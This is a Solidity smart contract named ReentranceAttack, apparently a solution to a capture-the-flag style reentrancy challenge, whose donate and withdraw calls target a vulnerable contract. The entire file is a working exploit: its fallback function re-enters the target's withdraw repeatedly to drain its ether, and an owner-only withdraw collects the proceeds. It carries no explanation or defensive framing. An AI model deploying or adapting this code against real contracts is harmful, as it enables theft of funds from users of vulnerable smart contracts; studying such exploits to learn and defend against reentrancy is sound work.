pragma solidity ^0.6.0;

import "@openzeppelin/contracts/math/SafeMath.sol";

contract ReentranceAttack {
    address payable target;
    address owner;

    constructor(address payable _target) public payable {
        target = _target;
        owner = msg.sender;
    }

    function attack() public payable {
        bytes memory payload =
            abi.encodeWithSignature("donate(address)", address(this));
        (bool success, ) = target.call.value(msg.value)(payload);
        if (success) {
            drain();
        } else {
            revert("error in donation");
        }
    }

    function drain() public payable {
        bytes memory payload =
            abi.encodeWithSignature("withdraw(uint256)", 1 ether);
        (bool success, ) = target.call(payload);
    }

    function withdraw() external {
        require(msg.sender == owner, 'only owner');
        msg.sender.transfer(address(this).balance);
    }

    fallback() external payable {
        drain();
    }
}
